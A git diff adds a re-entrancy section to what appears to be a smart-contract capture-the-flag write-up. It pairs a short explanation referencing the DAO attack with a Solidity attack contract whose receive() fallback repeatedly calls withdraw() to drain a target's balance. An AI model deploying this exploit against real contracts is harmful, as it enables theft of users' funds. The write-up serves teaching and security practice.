@@ -114,5 +114,27 @@ contract KingAttack {
     }
 }
 ```
+## 10. Re-entrancy
+Re-entrancy attacks are an interesting topic, first made popular by the infamous DAO attack during Ethereum's inception. The attack basically works to call an infinite loop of calls to the target contract to withdraw until there are no funds left. This can be done by using a ```receive()``` fallback function that calls on ```withdraw()``` function before the original call updates my address to 0.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Attack {
+    Reentrance public reentrance = Reentrance(Instance ID);
+
+    receive() external payable {
+        if(address(reentrance).balance != 0) {
+            uint256 drain  = address(reentrance).balance;
+            reentrance.withdraw(drain);
+        }
+    }
+
+    function donation() external payable {
+        reentrance.donate{value: 0.1 ether}(address(this));
+        reentrance.withdraw(0.1 ether);
+    }
+}
+```
 
 
